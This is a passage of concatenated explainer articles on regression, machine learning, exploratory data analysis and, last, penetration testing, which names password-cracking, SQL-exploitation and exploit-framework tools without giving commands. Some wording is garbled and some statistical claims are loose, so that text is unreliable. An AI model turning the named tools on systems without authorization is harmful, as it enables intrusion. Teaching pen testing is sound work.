Artificial neural networks with infinitely many hidden units are equivalent to non - parametric regression .
What are some specialized regression models ?
We note a few of these with brief descriptions : Robust Regression : This is better suited than linear regression for handling outliers or influential observations .
Observations are weighted .
Huber Regression : To handle outliers better , this optimizes a combination of squared error and absolute error .
Quantile Regression : Linear regression predicts the mean of the dependent variable .
Quantile regression predicts the median .
More generally , it predicts the nth quantile .
For example , predicting the 25th quantile of a house price means that there 's a 25 % chance that the actual price is below the predicted value .
Functional Sequence Regression : Sometimes predictors affect the outcome in a time - dependent manner .
This model includes the time component .
For example , onion weight depends on environmental factors at various stages of the onion 's growth .
Regression Tree : Use a decision tree to split the predictor space at internal nodes .
Terminal nodes or leaves represent predictions , which are the mean of data points in each partitioned region .
Could you share examples to illustrate a few regression methods ?
Regression lines fit a continuous predictor and a categorical predictor .
Source : PennState 2020b .
In a production plant , there 's a linear correlation between water consumption and the amount of production .
Simple regression suffices in this case , giving the fit as ` Water = 2273 + 0.0799 Production ` .
Thus , even without any production , 2273 units of water are consumed .
Every unit of production increases water consumption by 0.0799 units .
Both the predictor and outcome are continuous variables .
As an example of multiple linear regression , let 's predict the birth weight of a baby ( continuous variable ) based on two predictors : the mother is a smoker or non - smoker ( categorial variable ) and gestation period ( continuous variable ) .
We represent non - smokers as 0 and smokers as 1 .
The regular equation is ` Wgt = - 2390 + 143.10 Gest - 244.5 Smoke ` .
If we plot this , we 'll actually see two parallel lines , one for smokers and one for non - smokers .
One study looked at the number of cigarettes college students smoked per day .
They predicted this count from gender , birth order , education level , social / psychological factors , etc .
The study used poisson regression , negative binomial regression , and many others .
With so many types of regression models , how do I select a suitable one ?
Diagnostic plots can help validate assumptions .
Source : Kabacoff 2020 .
To apply linear regression , the main assumptions must be met : linearity , independence , constant variance and normality .
Linearity can be checked via graphical analysis .
A plot of residuals versus predicted values can show non - linearity , or use goodness of fit test .
Non - linear relations can be made linear using transformations of predictors and/or the outcome .
These could be log , square root or power transformations .
Try adding transformations of current predictors .
Try semi or non - parametric models .
In practice , linear regression is sensitive to outliers and cross - correlations .
Piecewise linear regression , particularly for time series data , is a better approach .
Non - parametric regression can be used when there 's an unknown non - linear relationship .
SVR is an example of non - parametric regression .
When overfitting is a problem , use cross validation to evaluate models .
Ridge , lasso and elastic net models can help tackle overfitting .
They can also handle multicollinearity .
Quantile regression is suited to handling outliers .
For predicting counts , use negative binomial regression if the variance is larger than the mean .
Poisson regression can be used only if the variance equals the mean .
What are some tips for analyzing model statistics ?
Analysis of model statistics .
Source : Princeton University 2020a .
Well - known model performance metrics include R - squared ( R2 ) , Root Mean Squared Error ( RMSE ) , Residual Standard Error ( RSE ) and Mean Absolute Error ( MAE ) .
We also have metrics that penalize additional predictors : Adjusted R2 , Akaike 's Information Criteria ( AIC ) and Bayesian Information Criteria ( BIC ) and Mallows Cp .
The higher the R2 or Adjusted R2 , the better the model .
For all other metrics , lower value implies a better model .
A high t - statistic implies coefficient is probably non - zero .
A low p - value on the t - statistic gives confidence in the estimate .
Low coefficients and low p - value for the model as a whole can imply multicollinearity .
While the t - test is applied to individual coefficients , the F - test is applied to the overall model .
The two models can be compared graphically .
For example , the coefficients and their confidence intervals can be plotted and compared visually .
What software packages support regression ?
In R , functions ` lm ( ) ` , ` summary ( ) ` , ` residuals ( ) ` and ` predict ( ) ` in the ` base ` package enable linear regression .
For GLM , we can use the ` glm ( ) ` function .
Use ` quantreg ` package for quantile regression ; ` glmnet ` for ridge , lasso and elastic net regression ; ` pls ` for principal component regression ; ` plsdepot ` for PLS regression ; ` e1071 ` for Support Vector Regression ( SVR ) ; ` ordinal ` for ordinal regression ; ` MASS ` for negative binomial regression ; ` survival ` for cox regression .
Other useful packages are ` stats ` , ` car ` , ` caret ` , ` sgd ` , ` BLR ` , ` Lars ` , and ` nlme ` .
In Python , ` scikit - learn ` provides a number of modules and functions for regression .
Use module ` sklearn.linear_model ` for linear regression including logistic , poisson , gamma , huber , ridge , lasso , and elastic net ; ` sklearn.svm ` for SVR ; ` sklearn.neighbors ` for k - nearest neighbours regression ; ` sklearn.isotonic ` for isotonic regression ; ` metrics ` for regression metrics ; ` sklearn.ensemble ` for ensemble methods for regression .
Regression starts with Carl Friedrich Gauss with the method of least squares .
He did n't publish the method until much later in 1809 .
In 1805 , Adrien - Marie Legendre invents the same approach independently .
Legendre uses it to predict the orbits of comets .
The first regression line , by Francis Galton .
Source : Gillham 2009 , fig .
2 .
Francis Galton plotted in 1877 what may be called the first regression line .
It concerns the size of sweet - pea seeds .
It correlated the size of daughter seeds with that of mother seeds .
Such an analysis came about in the course of investigating Darwin 's mechanism for heredity .
Through these experiments , Galton also introduced the concept of " reversion to the mean " , later called regression to the mean .
R.A. Fisher gives the exact sampling distribution of the coefficient of correlation , thus marking the beginning of multivariate analysis .
Fisher then simplifies it to a form via z - transformation .
In the early 1920s , he introduced the F distribution and maximum likelihood method of estimation .
Hotelling proposes Principal Component Regression ( PCR ) in an attempt to reduce the number of explanatory variables ( predictors ) in the regression model .
PCR itself is based on Principal Component Analysis ( PCA ) that was invented independently by Pearson ( 1901 ) and Hotelling ( 1930s ) .
Although the logistic function was invented by Verhulst in the 1830s , it was only in the 1960s that it was applied to regression analysis .
D.R. Cox was among the early researchers to do this .
Many researchers , including Cox , independently developed Multinomial Logistic Regression through the 1960s .
Hoerl and Kennard note that least square estimation is unbiased and this can give poor results if there 's multicollinearity among the predictors .
To improve the estimation , they propose a biased estimation approach that they call Ridge Regression .
Ridge regression uses standardized variables , that is , outcome and predictors are subtracted by mean and divided by standard deviation .
By introducing some bias , the variance of the least square estimator is controlled .
D.R. Cox applies regression to life - table analysis .
Among the sampled individuals , he observes either the time to " failure " or when the individual is removed from the study ( called censoring ) .
Moreover , the distribution of survival times is often skewed .
For these reasons , linear regression is not suitable .
Cox instead uses a hazard function that incorporates an age - specific failure rate .
In later years , this approach is simply called Cox Regression .
Nelder and Wedderburn introduce the Generalized Linear Model ( GLM ) .
As examples , they relate GLM to normal , binomial ( probit analysis ) , poisson ( contingency tables ) , and gamma ( variance components ) distributions .
However , it was only in the 1980s that GLM became popular due to the work of McCullagh and Nelder .
Koenker and Bassett introduce Quantile Regression .
This uses weighted least absolute error rather than least square error common in linear regression .
Huber proposes an estimator that 's quadratic in small values and grows linearly for large values .
It was later named Huber Regression .
Tibshirani proposes Lasso Regression that uses the least square estimator but constrains the sum of absolute value of coefficients to a maximum .
This forces some coefficients to zero or low values , leading to more interpretable models .
This is useful when we start with too many predictors .
Multivariate regression tree analysis for 12 species of hunting spiders .
Source : De'ath 2002 , fig .
2 .
De'ath proposes the Multivariate Regression Tree ( MRT ) .
The history of regression trees goes back to the 1960s .
With the release of CART ( Classification and Regression Tree ) software in 1984 , they became more well known .
However , CART is limited to a single response variable .
MRT extends CART to multivariate response data .
Zou and Hastie propose Elastic Net Regression .
This combines elements of both ridge regression and lasso regression .
Machine Learning with Data .
Source : Desjardins - Proulx 2013 .
Machine Learning is a data - oriented technique that enables computers to learn from experience .
Human experience comes from our interaction with the environment .
For computers , experience is indirect .
It 's based on data collected from the world , data about the world .
What we call data is really vast amounts of historical circumstances and reactions in a machine readable format .
The machine ( computer ) learns permutations and combinations of a given circumstance and reacts appropriately .
There is uncertainty in circumstances and hence reactions .
This is the unknown that the machine has to learn .
Machines aim to maximize the desired outcome .
Machine learning , due to its holistic approach , can solve a broad set of problems such as object detection , voice recognition , computational biology , price forecasting , and more .
How do machines learn ?
How Machines Learn .
Source : Jain 2015 .
Traditionally , intelligence was introduced into a system explicitly using rules .
The rules took the form of " if this happens while in this state , do that " .
These rules are derived from a knowledge base that 's particular to that domain or application .
However , such a rule - based system has limitations .
To characterize the system completely , there could be potentially hundreds of rules .
Moreover , rules come with exceptions that need to be considered as well .
This is clearly not manageable for complex systems .
Machine Learning takes a different approach .
Instead of working on pre - defined rules , machines look at large amounts of data .
For each data point , they take note of the associated response .
They do this with a sufficient amount of data and thereby implicitly learn the rules .
These implicit rules can be described in terms of features and outcomes .
For machines to learn properly , relevant and wide - ranging data should be made available .
Data should cover all possible scenarios .
Data is typically split into training datasets and testing datasets .
Machines learn from the former set .
The latter is used exclusively to validate the model .
The learning process is not linear .
It 's self - correcting and iterative .
What are the different Machine Learning types ?
Types of Machine Learning .
Source : Raschka 2017 .
Learning takes place based on what worked through historical events ( asynchronous learning ) and on what is accepted in contemporary events ( synchronous learning ) .
When a machine is trained using historical data , the learning can be classified as Supervised and Unsupervised learning : Supervised Learning uses a self - correcting feedback loop .
The expectation is labelled .
For instance , temperature , moisture and humidity ( called features ) can be used to predict the chance of rain in the next 24 hours .
Historic data that include temperature , moisture and humidity are recorded and labelled as ' Rain ' or ' Not Rain ' depending on whether it rained or not in the following 24 hours .
This is called the classification problem .
The system can also be designed to learn the amount of rain .
This is called the regression problem .
Unsupervised Learning becomes useful when labelled datasets are not available .
Without explicit instructions , the model attempts to find structure in the data .
Clustering , anomaly detection , association , autoencoders are different ways to organize data .
AI systems use synchronous learning to reward / penalise right / wrong decisions and prevent future mishaps .
Reinforcement Learning is concurrently applied in the decision process as a result of a series of actions .
How does ML differ from regression modelling ?
By purpose , ML is for predictions whereas regression is to infer relationships between variables .
But this is oversimplifying the truth .
Regression can also be used for predictions .
In general , statistical models are easier to interpret .
They use all of the data towards building the model , whereas ML partitions the dataset into training and test sets .
Linear regression comes from statistics and may be considered " too simple " to be treated as an ML approach .
However , ridge or lasso regression are derived from linear regression , and these are commonly used by ML researchers .
It 's therefore sensible to include regression in an ML toolbox .
In fact , understanding data should be the main goal and both statistical and ML models should be seen as tools .
Statistical modelling is highly contextual and with assumptions .
For instance , the math behind linear regression and logistic regression are very different .
Machine learning generalizes them under supervised learning and optimizes for minimum error .
All machines use numerical math techniques to iteratively solve unknown parameters .
What is feature engineering and why is it important ?
The place of feature engineering in the machine learning workflow .
Source : Casari and Zheng 2018 , Fig 1 - 2 .
Feature engineering comes after data is cleaned and transformed .
Feature engineering is arriving at relevant variables that relate to solving the problem at hand .
Feature engineering is done by domain experts who understand what each variable means , how to interpret it and how it relates to other variables .
A dataset will typically contain one or more variables or features .
Some of these may influence the outcome .
For example , temperature and humidity may be features that influence the chance of rain in the next six hours .
The data may also contain the time of day or day of the week , but these are features that probably do n't influence the chance of rain .
The job of an ML engineer is , therefore , to identify the right features for the problem .
The selected features add up to the outcome of the model .
The accuracy of the ML model directly depends on the features the ML engineer has chosen .
Good features make modelling a simpler task .
Bad features would result in a complicated model .
How does ML add value to Big Data ?
A Forrester report from 2016 showed that 60 - 73 % of all big data within enterprises is not used for analytics .
In 2018 , a report by DataRPM on the Industrial Internet - of - Things ( IIoT ) showed that 85 % of sensor data collected from trillions of data points is unused .
Manual analysis is impossible .
The use of ML can unlock the value in this data .
Today 's data coming from the mobile and the web includes video , audio , images and text .
In addition , lots of data comes from sensors in automotive and healthcare verticals .
Historic data in financial services or retail helps ML algorithms discover patterns .
Problems that rely on such data can be modelled better with the help of ML .
In fact , ML likes large volumes and a variety of data .
In an ideal case , ML has access to lots of data collected in diverse scenarios .
This enables efficient and holistic learning .
What kind of problems can be solved with ML ?
Broadly , the following problems are solved with ML : Regression : This is the task of predicting a continuous quantity .
Here , predictions are often made for quantities , such as amounts and sizes .
For example , a house may be predicted to sell for a specific dollar value , perhaps in the range of $ 100,000 to $ 200,000 .
Classification : This is the task of predicting a discrete class label .
For example , 1 .
An email text can be classified as belonging to one of two classes : ' spam ' and ' not spam ' , 2 .
image classification problems where there could be thousands of classes ( cat , dog , fish , car , etc .
) .
What 's the approach to solving ML problems ?
Machine Learning data test split process .
Source : Bhatia 2017 .
In a typical ML pipeline , we would classify the problem , gather data , process data , model the problem , execute the models , validate results , and deploy the solution .
Once you have defined the problem and outlined the features , you then need to split the data in a way that 's easy to test .
You split this data into a 70 ( train ) : 30 ( test ) ratio .
70 % with which machines learn and 30 % where it tests learning .
The training data is modelled for validation .
This model needs to be validated with a testing dataset and evaluated against multiple models to find the best model .
The idea of splitting data into training and test datasets can be traced to the Common Task Framework .
It 's important to have an acceptable accuracy percentage ( say , 60%+ ) across both training and testing datasets .
If the accuracy rate is n't high enough or not consistent across the two datasets , then the ML process should be repeated with different or modified features .
What is overfitting in the context of ML ?
Overfit , good fit and underfit .
Source : Bhande 2018 .
Often we read too much into the past .
We 're surprised to see that history did n't repeat itself .
This could happen either because the response is specific to one particular circumstance or there 's too little data .
When this happens in ML , we call it overfitting .
The possibility of overfitting exists because the criterion used for selecting the model may not be the same as the criterion used to judge the suitability of a model .
For example , a model might be selected by maximizing its performance on some set of training data , and yet its suitability must be determined by its ability to perform well on unseen data .
We can state that overfitting occurs when a model has memorized training data rather than learned to generalize from a trend .
Could you compare or contrast Machine Learning ( ML ) , Deep Learning ( DL ) and Artificial Intelligence ( AI ) ?
AI , ML and DL .
Source : Pinterest 2018 .
This is better explained through an example .
ML is about learning a task .
For instance , a self - driving car learns many tasks : to brake or not to brake , speeding up or slowing down , turning the steering wheel , indicator functions , etc .
While ML learns all these tasks separately , AI executes them in a coordinated manner , rewards good decisions , and penalises wrong decisions .
AI also accounts for contextual information that may not be part of ML .
Thus , ML is an approach to realizing AI .
DL is a special case of ML and it 's inspired by how neurons in the human brain process information .
While ML learns once , DL does it in multiple stages .
ML expects features to be provided at the input .
DL discovers features on its own .
When problems are complex , DL does better than ML .
For example , recognizing a human may involve identifying basic features ( eyes , ears , hands , legs , etc .
) at stage 1 ; and identifying higher order features ( face , upper body , lower body , etc .
) in stage 2 ; and finally calling it out as ' Human ' in stage 3 .
How to improve the accuracy of ML models ?
Comparing Bagging and Boosting methods .
Source : Aporras 2016 .
Ensemble methods are techniques that create multiple models and then combine them to produce better results .
For example , a candidate goes through multiple rounds of job interviews .
Although a single interviewer might not be able to test the candidate for each required skill and trait , the combined feedback of multiple interviewers usually helps in a better assessment of the candidate .
Bagging ( Bootstrap Aggregating ) is an ensemble method .
First , we created random samples of the training dataset ( subsets of the training dataset ) .
We build a classifier for each sample .
Finally , results of these multiple classifiers are combined using averaging or majority voting .
Bagging helps to reduce the variance error .
Boosting : The first predictor starts by classifying the original dataset with equal weights to each observation .
If classes are predicted incorrectly using the first learner , then it gives higher weight to the wrongly classified observation for the successive learners .
Being an iterative process , it continues to add classifiers learners until a limit is reached in the number of models or accuracy .
Boosting has shown better predictive accuracy than bagging , but tends to overfit the training data .
In what scenarios is ML not applicable or has failed ?
ImageNet evolution timeline .
Source : Guo et al .
2016 .
ML is applied in diverse fields where plenty of data is available .
There are scenarios where ML has challenges , but constant endeavor ensures improved accuracy and increased acceptability .
In the accompanying figure we can see how ImageNet ML algorithms have evolved for better accuracy .
Failure of ML can be attributed to incorrect problem formulation , wrong choice of features or inappropriate algorithms .
ML algorithms can become biased for various reasons .
For example , an algorithm that sees only men writing code and only women in the kitchen in its training data will naturally become biased .
In a real - world case of bias , Google Allo once responded with a turban emoji when shown a gun emoji .
Google Translate showed gender bias in Turkish - English translations .
Amazon 's AI - based recruiting tool was found to be favour male candidates .
Other failures of AI / ML happened in 2018 .
Uber 's self - driving car killed a pedestrian .
IBM 's Watson AI Health has failed to impress doctors .
Alan Turing created the Turing Test in which a computer must attempt to pass itself off as a human to other humans .
In June 2014 , a robot named Eugene passed this test by convincing 33 % of the judges .
A more difficult variant called the Loebner Prize requires that more than 50 % of the judges be convinced after a 25-min conversation .
As of March 2018 , no robot has won the prize .
Arthur Samuel wrote the first learning program .
Applied to the game of checkers , the program is able to learn from mistakes and improve its gameplay with each new game .
By the mid-1970s , the program beat humans on checkers .
Board games are useful in developing ML because they are understandable and complex .
Just as the human brain is composed of interconnected neurons , Frank Rosenblatt designed the first artificial neural network called the perceptron .
The idea is to solve complex problems through a series of simple decisions .
Rosenblatt applies it for doing image recognition .
The Nearest Neighbour algorithm is created and applied to map route .
This starts the field of pattern recognition .
The Stanford Cart .
Source : Sheth 2017 .
Invented by researchers at Stanford University , a robot now named the Stanford Cart is able to navigate obstacles in a room on its own .
Gerald Dejong invents Explanation Based Learning .
The computer uses data to train itself and create rules to achieve a given goal .
It discards information irrelevant to the problem .
This is a type of supervised learning .
In general , the 1980s was the decade of expert systems that were based on rules .
The 1990s were the decade when the approach to ML shifted from being knowledge - driven to data driven .
This is supported through the next two decades with greater availability of data , cloud computing and big data technologies .
Geoffrey Hinton coins the term Deep Learning ( DL ) to describe new architectures of neural networks .
This approach is applied to image recognition .
The Google Brain project uses DL to detect visual patterns .
The Google X project applies Google Brain to YouTube videos to identity frames that contain cats .
Geoffrey Hinton leads a team and wins ImageNet 's computer vision contest by a large margin .
This popularized DL .
In the coming years , DL will become an important technique to create models with much better accuracy .
This is the decade when DL becomes feasible .
Google 's AlphaGo uses ML to beat professional player Lee Sedol in a challenging board game called Go .
Google Brain chief Jeff Dean states that DL starts to work with at least 100,000 data points .
This underscores the importance of data availability for DL .
Exploratory Data Analysis ( EDA ) consists of techniques that are typically applied to gain insight into a dataset before doing any formal modelling .
EDA helps us to uncover the underlying structure of the dataset , identify important variables , detect outliers and anomalies , and test underlying assumptions .
With EDA , we identify relevant variables , their transformations , and interaction among variables with respect to the model we want to build .
EDA can also point out missing data as may be relevant to building desired models .
EDA uses techniques of statistical graphics but has a broader scope .
It 's an approach rather than just a set of techniques .
The general idea is , let the data speak for themselves ... Exploratory Data Analysis is not “ fishing ” or “ torturing ” the data set until it confesses .
What 's the recommended process for doing Exploratory Data Analysis ?
A typical EDA process .
Source : Ghosh et al .
2018 , fig .
3 .
One can follow these steps : Look at the structure of the data : number of data points , number of features , feature names , data types , etc .
When dealing with multiple data sources , check for consistency across datasets .
Identify what data signifies ( called measures ) for each of the data points and be mindful while obtaining metrics .
Calculate key metrics for each data point ( summary analysis ) : a. Measures of central tendency ( Mean , Median , Mode ) ; b. Measures of dispersion ( Range , Quartile Deviation , Mean Deviation , Standard Deviation ) ; c. Measures of skewness and kurtosis .
Investigate visuals : a. Histogram for each variable ; b. Scatterplot to correlate variables .
Calculate metrics and visuals per category for categorical variables ( nominal , ordinal ) .
Identify outliers and mark them .
Based on context , either discard outliers or analyze them separately .
Estimate missing points using data imputation techniques .
What are the data types used in EDA ?
Levels of measurement .
Source : Pinterest 2018 .
In statistics and Machine Learning , data types are also called levels of measurement .
Four common ones are used : Nominal : This is qualitative , not quantitative ; eg .
Religious Preference : 1 = Buddhist , 2 = Muslim , 3 = Christian , 4 = Jewish , 5 = Other .
Ordinal : An ordinary scale that indicates ordering or direction in addition to providing nominal information ; eg .
Low / Medium / High or Faster / Slower are examples of ordinary levels of measurement .
Ranking an experience as a " nine " on a 1 - 10 scale tells us that it was higher than an experience ranked as a " six " .
Interval : Interval scales provide information about order , and also the ability to compare ranges ; eg .
temperature is measured either on a Fahrenheit or Celsius scale : measured in Fahrenheit units , the difference between a temperature of 46 and 42 is the same as the difference between 72 and 68 .
Ratio : In addition to possessing the quality of nominal , ordinal , and interval scales , a ratio scale has an absolute zero , a point where none of the quality being measured exists ; eg .
income , years of work experience , number of children .
What are measures of central tendency ?
Comparing mean and median can tell us about skewness .
Source : Dugar 2018 .
A measure of central tendency is a single value that attempts to describe a set of data by identifying the central position within that set of data .
These include the following : Mean : Mean is equal to the sum of all the values in the data set divided by the number of values in the data set .
This is also called arithmetic meaning .
Other means , such as geometric meaning and harmonic meaning , are also sometimes useful .
Median : Median is the middle score for a set of data that has been arranged in order of magnitude .
For example , given an ordered list of student marks , [ 14 35 45 55 55 56 58 65 87 89 92 ] , the median is 56 because it is the middle mark since there are 5 items before it , 5 items after it .
Mode : Mode is the most frequent score in our data set .
For the above data set of student marks , mode is 55 because 55 is repeated for the maximum number of times .
What are measures of dispersion ?
Measures of dispersion .
Source : Banerjee 2020 .
Measures of dispersion are important for describing the spread of the data , or its variation around a central value .
The Range is the difference between the smallest value and the largest value in the data set .
This is the simplest measure but it 's based on extreme values and tells nothing about the data in between .
Standard Deviation is therefore a better measure .
A value within & plusmn;1 SD from mean is considered normal ; a value beyond & plusmn;3 SD is considered extremely abnormal .
One alternative to this is a simple measure called Mean Absolute Deviation ( MAD ) .
Another alternative , often used as a measurement of error , is Root Mean Square Anomaly ( RMSA ) .
If one desires the spread of data around the central region of data , Quartile Deviation is a good measure .
This is half of what 's called Interquartile Range ( IQR ) .
A variation of this that considers all data is called Median Absolute Deviation ( MAD ) .
What is Skewness and Kurtosis ?
Illustrating skewness and kurtosis in a distribution .
Source : Sharma 2017 .
Skewness is a measure of symmetry , or more precisely , the lack of symmetry .
A distribution , or data set , is symmetric if it looks the same to the left and right of the central point .
Kurtosis is a measure of whether the data are heavy - tailed or light - tailed relative to a normal distribution .
That is , data sets with high kurtosis tend to have heavy tails , or outliers .
Data sets with low kurtosis tend to have light tails , or lack of outliers .
Can measures of central tendency , dispersion , skewness and kurtosis be the same for different datasets ?
The Anscombe 's quartet .
Source : Turner 2016 .
Yes , it 's possible .
Statistician Francis Anscombe came up with four datasets to illustrate the importance of graphing data before analyzing it , and to show the effect of outliers on statistical properties .
This is now called Anscombe 's quartet .
It comprises of four datasets that have nearly identical simple statistical properties , yet appear very different when graphed .
Each dataset consists of eleven ( x , y ) points .
Anscombe 's quartet emphasizes the importance of looking at your data , not just the summary statistics and parameters you compute from it .
What are outliers and how to handle outliers ?
An outlier example is linear regression .
Source : Math Open Reference 2011 .
Any observation that appears to deviate markedly from other observations in the sample is considered an outlier .
Identifying an observation as an outlier depends on the underlying distribution of the data .
Determining whether an observation is an outlier or not is a subjective exercise .
Context dictates whether to focus on or get rid of outliers .
For example , in an income distribution , a luxury brand company would focus on the outliers ( the rich people ) while a government public distribution system would choose to get rid of the outliers .
It 's recommended that you generate a normal probability plot of the data before applying an outlier test .
Outliers can also come in different flavours , depending on the environment : point outliers , contextual outliers , or collective outliers .
What are the visual aids for exploratory analysis ?
Various charts to aid exploratory data analysis .
Source : Grosser 2018 .
Data can be represented visually in many ways with programming languages and visualization packages .
Programming languages such as R , Python , Matlab , SAS , etc .
provide libraries for creating data visuals .
In JavaScript , we have D3.js , NVD3 , FusionCharts and Chart.js .
In Python , we have Matplotlib , Seaborn , Bokeh and Plotly .
There are dedicated visualization platforms such as Tableau , Qlikview , and PowerBI in the market that even non - programmers and traditional data analysts can use to make visuals .
Histograms and scatterplots are widely used for exploratory analysis to quickly understand the structure of data and inter - relations of variables .
However , numerous other charts can be used to create visuals that have repeat purpose and long shelf life .
What should we look for in a histogram or a distribution ?
Distribution of average body weight .
Source : Cain 2018 .
The histogram represents the underlying structure in the form of a frequency distribution ; that is , how often a particular value occurs .
Visually , a histogram is similar to a bar chart .
While a bar chart has bars for individual values , in a histogram it 's more common to group together a range of values into a single bin .
Often , 5 - 15 bins should be considered depending on the range of values in the dataset .
With too few bins , the graph will not be detailed enough to interpret the distribution .
In fact , due to binning , histograms can plot both categorical and continuous variables .
Bar charts are only for categorical variables .
Histograms help us see data symmetry , peaks , outliers or data error through omission .
In the figure , two peaks imply two distinct classes .
Additional data informs us that the peaks are due to gender differentiation .
If we split the data by gender , we will get two histograms , each with a single peak .
Thus , when we see multimodal histograms ( more than one peak ) , there 's room to split the data .
For every peak , we can build a different model .
What should we look for in a scatterplot ?
Scatter the plot with outliers in two dimensions .
Source : Criteria Corp 2018 .
Scatterplot is a mechanism to plot two variables and see the underlying relationship between them .
A scatterplot can reveal data symmetry , clusters , correlation between variables , and extreme values or outliers .
The plot is a series of dots " scattered " in two dimensions .
Often a line is drawn across these dots .
The line does n't connect the actual points , unlike a line graph .
The line , often called regression line , shows the trend and can be used as a predictive tool .
A scatterplot is two - dimensional ( two variables ) while a histogram is one - dimensional ( one variable ) .
Hence , we should pay more attention to outliers in scatterplots .
For example , in the accompanying image , Employee # 2 and Employee # 19 are both outliers when we consider their test scores and sales performance .
However , if we analyze the data in either of these variables separately , they will not appear as outliers .
In technical jargon , histogram provides Univariate Visualization .
Scatterplot provides Bivariate Visualization .
What 's a pair plot and what 's its utility ?
Pairs plot for Iris Data .
Source : Waskom 2018 .
A pair plot is a plot that helps comprehend the underlying structure of a variable and its relationship with other variables in a single visual .
Basically , it 's a combination of history and scatterplot in one visual .
This can help us notice patterns that may not be obvious when analyzed separately .
How do we handle missing data ?
Data is rarely complete and may have missing points .
Data can be missing for various reasons : not captured , captured but may not be available , etc .
In such circumstances , it 's normal to estimate the missing value and proceed with analysis .
This process is called imputation .
There are many standard imputation procedures and algorithms to estimate missing data .
John Snow 's dot map showing locations of cholera cases .
Source : Friendly and Denis 2001 , 1850 + : Dot map of disease .
John Snow uses a dot plot on a map of London to analyze the 1854 cholera outbreak .
He suspects water contamination at the Broad Street pump .
The mapped data presents a compelling visual that this could be true .
Although not strictly EDA , this is an example of using data visualization to confirm a hypothesis .
Dmitri Mendeleev organizes known chemical elements into a periodic table .
This visual suggests some undiscovered elements .
This is a good example of EDA leading to new discoveries .
Francis Galton 's bivariate frequency chart .
Source : Rao 1983 , fig .
1 .
Francis Galton creates a bivariate frequency chart that evolves later to today 's more familiar correlation diagram .
He uses it to analyze the relationship between the heights of parents and adult children .
In earlier experiments from the 1870s , he did a similar correlation study with sweet - pea seeds .
Karl Pearson proposes the kurtosis coefficient as a way to measure the degree of flatness of frequency distributions .
Along with the skewness coefficient proposed earlier , he challenges the notion that most distributions are normal or should be transformed to normality .
Instead , we should accurately represent observed data .
Statistician Francis Anscombe constructed the Anscombe 's quartet to demonstrate the importance of graphing data before analyzing it and the effect of outliers on statistical properties .
Cover of Tukey 's classic on Exploratory Data Analysis .
Source : o0sfz8 2014 .
John W. Tukey , often considered the father of EDA , published " Exploratory Data Analysis " at a time when computer - aided visualization was still nascent .
He introduces new plots such as the stem - leaf plot and the five - point boxplot .
He implies that Confirmatory Data Analysis ( CDA ) can suffer from confirmation bias due to predetermined hypothesis .
EDA is a more open - minded approach to discovering patterns in data and to answering specific scientific questions .
Just as languages have grammar , Leland Wilkinson formalized grammar for making graphs .
Called Grammar of Graphics , it defines a structure to combine graph elements so that data can be shown in meaningful ways .
This later inspires others to implement the same in popular languages ( R , Python , Julia , D3 ) .
Today 's networked systems have a greater attack surface because computers are interconnected and can be accessed remotely .
Systems and servers are also complex since they offer dozens of services and run many different software packages .
Anyone gaining access to such a system without authorization can damage operations and steal data .
It 's therefore essential to know what security vulnerabilities are present and take corrective action early on .
Penetration testing is a proactive attempt to discover and exploit vulnerabilities in the system .
The idea is not to cause damage as a malicious hacker would .
Instead , it 's to discover what 's wrong , show how much damage can be done , or prove that existing measures are mitigating these attacks as they happen .
Penetration testing can be manual or automated .
Penetration testing is also called pen testing .
What 's a typical pen testing process ?
Typical stages involved in pen testing .
Source : Imperva 2018 , CC BY 4.0 .
With pen testing , we typically explore or scan the system to discover vulnerabilities .
Once discovered , we try to exploit them and see what happens .
The behaviour is captured and reported for analysis .
Scanning can be static code analysis or dynamic run - time analysis .
Pen testing requires a proper testing plan .
Reporting should be consistent .
Problems should be marked with levels of severity .
Finally , there should be an action plan to mitigate or manage vulnerabilities .
Since attacks are often preceded by an assessment , Vulnerability Assessment and Penetration Testing ( VAPT ) is a term commonly used .
It 's also possible to do both these in parallel : vulnerability assessment involving scans and analysis ; pen testing involving analysis and attacks .
A vulnerability scan is faster than detailed pen testing , but pen testing is more accurate since some reported vulnerabilities might be false positives .
What are some types of pen testing ?
Pen testing typically covers one or more of the following : Network : Involves firewalls , routers , SSH , port scanning , and anything else that will allow an attacker to gain network access .
Wireless : Often systems involve wireless access .
Pen testing should look at wireless traffic , encryption protocols , unauthorized access points , poor passwords , MAC address spoofing , etc .
Web : Any website or web app can be vulnerable at the application layer .
Pen testing should check cross - site scripting , SQL injections , DoS attacks , web server misconfiguration , failure to protect sensitive data , etc .
This could include vulnerabilities on the client - side of the app .
Physical : Systems have to be physically secure as well in terms of locks , motion sensors , etc .
Social Engineering : Users can be manipulated or fooled to provide unauthorized access to systems .
Phishing , tailgating and eavesdropping are some of the techniques .
Cloud : When apps reside in the cloud , cloud pen testing may be required .
You will need to know from your cloud provider what assets are off limits for pen testing .
What are some methods or approaches to pen testing ?
Black - box , white - box and gray - box testing are different approaches to pen testing .
Source : Core Sentinel 2017 .
External testing is useful to mimic how an outsider might attack the system .
Internal testing is to ascertain how much and what damage a disgruntled employee or another user with authorized access can cause .
Targeted testing is when multiple teams work together and everyone can see the tests as they are executed .
Blind testing is when limited information is given to the pen tester .
Double - blind testing goes one step further : very few in the company know that pen testing is happening .
This will determine if security monitoring and responses happen as expected .
Black box testing is an extreme case of blind testing .
Pen testers are given no information .
White box testing gives pen testers lots of useful information to speed up the process .
Black box testing is more realistic but slow .
White box testing is more thorough .
When is the right time to do pen testing ?
Pen testing should be done regularly .
Previous approaches of doing this annually are seen to be outdated .
The recommendation is to have pen testing as part of regular development and release processes .
If this is not possible in - house , there are providers who offer pen testing as a service .
Typically , vulnerability scans could be part of CI / CD pipelines and longer attack tests could be done nightly .
In addition , when there are changes made to the app / network / server / system , pen testing should be done .
Such changes might include moving to a new office premise , releasing a patch , changing user policies , or adding new infrastructure .
Could you mention some tools that help with pen testing ?
A selection of tools for pen testing , often bundled into Kali Linux .
Source : Flora 2017 .
It 's interesting to note that tools that might be used by malicious hackers can also be useful for pen testing .
The site SecTools .
Org maintains a list of 100 + network security tools .
The Angry IP Scanner is for scanning IP addresses and ports .
Ettercap can read and inject packets into the network adaptor .
For cracking passwords , there 's Cain and Abel or John the Ripper .
To crack Wi - Fi passwords , Aircrack - ng is useful .
For attacking web apps , we have Burp Suite and OWASP ZAP .
For exploiting SQL flaws , there 's Sqlmap .
Nessus is a well - known vulnerability scanner .
Wireshark is a popular tool for interactively analyzing network logs .
Metasploit is a framework for developing and reuse exploit code .
System admins can use Responder , Powershell Empire , Hashcat , Arpspoof and Wireshark .
